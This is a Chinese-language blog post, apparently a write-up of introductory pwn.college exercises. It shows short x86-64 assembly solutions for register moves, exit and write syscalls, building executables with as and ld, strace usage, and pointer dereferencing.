

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/Pi.png">
  <link rel="icon" href="/img/Pi.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Lobo Q1ng">
  <meta name="keywords" content="">
  
    <meta name="description" content="Getting StartedComputing 101Your First Program1. Your First Register这道题的要求是讲值60移动到rax寄存器中。并将汇编代码放进某个.s文件中 1mov rax,0x3c  比较简单 2. Your First Syscall这道题通过将系统调用号为60传给eax，并执行系统调用指令systemcall，来调用exit 12mov">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn.college 题解">
<meta property="og:url" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/index.html">
<meta property="og:site_name" content="Q1ng&#39;s blog">
<meta property="og:description" content="Getting StartedComputing 101Your First Program1. Your First Register这道题的要求是讲值60移动到rax寄存器中。并将汇编代码放进某个.s文件中 1mov rax,0x3c  比较简单 2. Your First Syscall这道题通过将系统调用号为60传给eax，并执行系统调用指令systemcall，来调用exit 12mov">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241030201710671.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241031112813128.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250303120441856.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202238497.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202710303.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107204303139.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107210124444.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107211657926.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107212701406.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107213541957.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107214343087.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241108212052627.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241110102042920.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250304121108218.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250306162439521.png">
<meta property="article:published_time" content="2025-02-28T16:58:42.000Z">
<meta property="article:modified_time" content="2025-03-29T08:56:11.125Z">
<meta property="article:author" content="Lobo Q1ng">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://loboq1ng.github.io/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241030201710671.png">
  
  
  
  <title>pwn.college 题解 - Q1ng&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"loboq1ng.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Q1ng&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/letter.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="pwn.college 题解"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-03-01 00:58" pubdate>
          2025年3月1日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          39k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          328 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">pwn.college 题解</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Computing-101"><a href="#Computing-101" class="headerlink" title="Computing 101"></a>Computing 101</h2><h3 id="Your-First-Program"><a href="#Your-First-Program" class="headerlink" title="Your First Program"></a>Your First Program</h3><h4 id="1-Your-First-Register"><a href="#1-Your-First-Register" class="headerlink" title="1. Your First Register"></a>1. Your First Register</h4><p>这道题的要求是讲值60移动到<code>rax</code>寄存器中。并将汇编代码放进某个.s文件中</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x3c</span><br></code></pre></td></tr></table></figure>

<p>比较简单</p>
<h4 id="2-Your-First-Syscall"><a href="#2-Your-First-Syscall" class="headerlink" title="2. Your First Syscall"></a>2. Your First Syscall</h4><p>这道题通过将系统调用号为60传给eax，并执行系统调用指令<code>systemcall</code>，来调用exit</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="3-Exit-Codes"><a href="#3-Exit-Codes" class="headerlink" title="3. Exit Codes"></a>3. Exit Codes</h4><p>依然是调用指令，但是退出代码要求为42。42作为参数，那么系统调用的第一个参数通过rdi寄存器传递。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="4-Building-Executables"><a href="#4-Building-Executables" class="headerlink" title="4. Building Executables"></a>4. Building Executables</h4><p>要构建可执行二进制文件，步骤如下：</p>
<ol>
<li>将程序集写入文件（通常带有.s或.S语法）</li>
<li>将二进制文件汇编到可执行对象文件中（使用as命令）</li>
<li>将一个或多个可执行对象文件链接到最终的可执行二进制文件中（使用ld命令）</li>
</ol>
<p>使用Intel汇编语法，要让汇编者知道这一点。为此，再汇编代码的开头加上一个指令，如下所示（以上一个level的代码为例）。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>

<p><code>.intel_syntax noprefix</code>会告诉汇编器使用Intel汇编语法，特别是它的变体，从而不必为每个指令添加额外的前缀。</p>
<p>接下来分别使用as命令和ld命令来构建可执行二进制文件</p>
<p><code>as -o asm.o asm.s</code> 和 <code>ld -o exe asm.o</code>这将创建一个exe文件，随后可以运行该文件。</p>
<blockquote>
<p>ld命令：link editor</p>
<p>在典型的开发工作流程中，编译源代码并将汇编代码汇编成目标文件，通常有很多这样的文件（通常，程序中的每个源代码文件都编译成自己的目标文件）。然后，这些内容将<strong>链接</strong>在一起，形成一个可执行文件。即使只有一个文件我们仍然需要链接它，以准备最终的可执行文件。这是通过ld命令完成的。</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">hacker@your-first-program~<span class="hljs-keyword">exit</span>-codes:~$ as -o hello.o hello.s<br>hacker@your-first-program~<span class="hljs-keyword">exit</span>-codes:~$ ld -o exe hello.o<br><span class="hljs-regexp">/nix/</span>store<span class="hljs-regexp">/q3sm4x963a996qc3d6baw54609ryifak-binutils-2.41/</span>bin/ld: warning: cannot find entry symbol _start; defaulting to <span class="hljs-number">0000000000401000</span><br></code></pre></td></tr></table></figure>

<p>这里会有一个<code>_start</code>警告，这是因为ld会打印有关输入符号<code>_start</code>的警告。<code>_start</code>符号本质上是给ld的注释，说明在执行ELF时程序执行应该从何处开始。该警告指出，如果没有指定的<code>_start</code>，执行将从代码的开头开始。这对我们来说很好！</p>
<p>如果不希望出现这个警告，那么可以修改成：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>

<p>第二个<code>_start</code>标签指向代码的开头，第一个<code>.global _start</code>指示这个标签在链接器级别<strong>全局可见</strong>，而不仅仅是在对象文件级别本地可见。</p>
<h4 id="5-Tracing-Syscalls"><a href="#5-Tracing-Syscalls" class="headerlink" title="5. Tracing Syscalls"></a>5. Tracing Syscalls</h4><p>调试程序的工具和技术：<strong>strace</strong></p>
<p>用法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@dojo:~$ strace /tmp/your-program<br>execve(<span class="hljs-string">&quot;/tmp/your-program&quot;</span>, [<span class="hljs-string">&quot;/tmp/your-program&quot;</span>], 0x7ffd48ae28b0 /* 53 vars */) = 0<br><span class="hljs-built_in">exit</span>(42)                                 = ?<br>+++ exited with 42 +++<br>hacker@dojo:~$<br></code></pre></td></tr></table></figure>



<p>这道题的exp:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">hacker@your-first-program~tracing-syscalls:~$ strace <span class="hljs-regexp">/challenge/</span>trace-me <br>execve(<span class="hljs-string">&quot;/challenge/trace-me&quot;</span>, [<span class="hljs-string">&quot;/challenge/trace-me&quot;</span>], <span class="hljs-number">0</span>x7ffc5d085500 <span class="hljs-regexp">/* 26 vars */</span>) = <span class="hljs-number">0</span><br>alarm(<span class="hljs-number">6398</span>)                             = <span class="hljs-number">0</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)                                 = ?<br>+++ exited with <span class="hljs-number">0</span> +++<br>hacker@your-first-program~tracing-syscalls:~$ <span class="hljs-regexp">/challenge/</span>submit-number <span class="hljs-number">6398</span><br>CORRECT! Here is your flag:<br>pwn.college&#123;wHIzj1noGySkn_Bsyfc41LKkCc3.dFzN4UDLxYTN1YzW&#125;<br></code></pre></td></tr></table></figure>



<h4 id="6-Moving-Between-Registers"><a href="#6-Moving-Between-Registers" class="headerlink" title="6. Moving Between Registers"></a>6. Moving Between Registers</h4><p><code>rsi</code>寄存器，像<code>rdi</code>寄存器一样能存东西。</p>
<p>这道题要将rsi的值作为exit系统调用的代码</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h3 id="Computer-Memory"><a href="#Computer-Memory" class="headerlink" title="Computer Memory"></a>Computer Memory</h3><h4 id="1-Loading-From-Memory"><a href="#1-Loading-From-Memory" class="headerlink" title="1. Loading From Memory"></a>1. Loading From Memory</h4><p>从内存中加载数据</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-number">133700</span>]	# 从内存[<span class="hljs-number">0x133700</span>]处获得数据，存于<span class="hljs-built_in">rdi</span>寄存器中<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="2-More-Loading-Practice"><a href="#2-More-Loading-Practice" class="headerlink" title="2. More Loading Practice"></a>2. More Loading Practice</h4><p>同样的从内存中加载数据</p>
<h4 id="3-Dereferencing-Pointers"><a href="#3-Dereferencing-Pointers" class="headerlink" title="3. Dereferencing Pointers"></a>3. Dereferencing Pointers</h4><p>rax解引用，将rax存储的地址取出，并将这个地址所指向的值赋予rdi寄存器</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="4-Dereferencing-Yourself"><a href="#4-Dereferencing-Yourself" class="headerlink" title="4. Dereferencing Yourself"></a>4. Dereferencing Yourself</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="5-Dereferencing-with-Offsets"><a href="#5-Dereferencing-with-Offsets" class="headerlink" title="5. Dereferencing with Offsets"></a>5. Dereferencing with Offsets</h4><p>说明：</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">  Address │ Contents<br>+────────────────────+<br>│<span class="hljs-number"> 133700 </span> │<span class="hljs-number"> 50 </span>      │◂┐<br>│<span class="hljs-number"> 133701 </span> │<span class="hljs-number"> 42 </span>      │ │<br>│<span class="hljs-number"> 133702 </span> │<span class="hljs-number"> 99 </span>      │ │<br>│<span class="hljs-number"> 133703 </span> │<span class="hljs-number"> 14 </span>      │ │<br>+────────────────────+ │<br>                       │<br> Register │ Contents   │<br>+────────────────────+ │<br>│ rdi     │<span class="hljs-number"> 133700 </span>  │─┘<br>+────────────────────+<br></code></pre></td></tr></table></figure>

<p>如果我想获取42这个数字，那么可以：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure>

<p>最终的exp：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="6-Stored-Address"><a href="#6-Stored-Address" class="headerlink" title="6. Stored Address"></a>6. Stored Address</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-number">567800</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="7-Double-Dereference"><a href="#7-Double-Dereference" class="headerlink" title="7. Double Dereference"></a>7. Double Dereference</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="8-Triple-Dereference"><a href="#8-Triple-Dereference" class="headerlink" title="8. Triple Dereference"></a>8. Triple Dereference</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h3 id="Hello-Hackers"><a href="#Hello-Hackers" class="headerlink" title="Hello Hackers"></a>Hello Hackers</h3><h4 id="1-Writing-Output"><a href="#1-Writing-Output" class="headerlink" title="1. Writing Output"></a>1. Writing Output</h4><p><code>write</code>系统调用的<code>syscall</code>编号为1。但是write系统调用还需要通过其参数指定要写入的数据以及将其写入的位置。</p>
<p><code>write</code>系统调用通过获取两个参数，即分别代表开始写入和要写入多少个字符。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">write</span><span class="hljs-params">(file_descriptor, memory_address, number_of_characters_to_write)</span></span><br></code></pre></td></tr></table></figure>

<p>其中，rdi寄存器传递系统调用的第一个参数。<strong>rsi寄存器传递第二个参数，rdx寄存器传递第三个参数。</strong></p>
<p>exp:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="2-Chaining-Syscalls"><a href="#2-Chaining-Syscalls" class="headerlink" title="2. Chaining Syscalls"></a>2. Chaining Syscalls</h4><p>正确退出</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1337000</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">42</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>





